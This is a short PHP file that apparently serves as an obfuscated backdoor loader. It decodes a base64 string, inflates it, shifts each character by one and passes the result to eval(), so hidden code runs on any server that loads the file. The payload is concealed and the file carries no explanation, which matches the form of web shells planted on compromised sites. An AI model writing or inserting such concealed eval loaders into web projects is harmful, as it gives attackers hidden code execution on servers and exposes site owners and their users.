<?php function ghS($mkp)
{
    $mkp=gzinflate(base64_decode($mkp));
    for($i=0;$i<strlen($mkp);$i++)
    {
        $mkp[$i] = chr(ord($mkp[$i])-1);
    }
    return $mkp;
}eval(ghS("U1QEAu6U3KSSEsXStJJS4xpukEhhWXJuVopiell+SmlWQb5iVn5qWqWmFkQSBNJSMgsUNTLTcnMLFCsKilM1bMBSddx1AA=="));?>
